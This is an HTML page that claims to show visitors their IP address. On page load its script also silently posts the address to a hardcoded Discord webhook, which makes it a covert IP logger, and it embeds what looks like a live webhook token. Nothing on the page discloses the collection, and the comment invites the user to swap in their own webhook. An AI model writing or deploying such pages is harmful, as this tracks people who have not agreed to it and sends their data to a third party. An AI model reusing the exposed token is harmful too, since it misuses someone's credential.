<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Your IP Address</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #74ebd5, #acb6e5);
            color: #333;
        }
        .container {
            text-align: center;
            background: #fff;
            padding: 20px 40px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .container h1 {
            margin-bottom: 20px;
            font-size: 2rem;
            color: #444;
        }
        .container p {
            font-size: 1.5rem;
            margin: 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Your IP Address</h1>
        <p id="ip">Loading...</p>
    </div>
    <script>
        const webhookURL = "https://discord.com/api/webhooks/1331158148152561686/vFYMOS2KQrtz-EE1wAoe_fdjQVpEeB8dzUsEM5fO2MJosdDG96AB2q90gJ8gmxAqjcBB"; // Replace with your webhook URL

        async function fetchIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;

                // Display IP on the page
                document.getElementById('ip').textContent = ip;

                // Send IP to webhook
                sendToWebhook(ip);
            } catch (error) {
                document.getElementById('ip').textContent = 'Unable to fetch IP.';
                console.error('Error fetching IP:', error);
            }
        }

        async function sendToWebhook(ip) {
            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `New visitor IP: ${ip}`
                    })
                });
                console.log('IP sent to webhook successfully.');
            } catch (error) {
                console.error('Error sending IP to webhook:', error);
            }
        }

        fetchIP();
    </script>
</body>
</html>
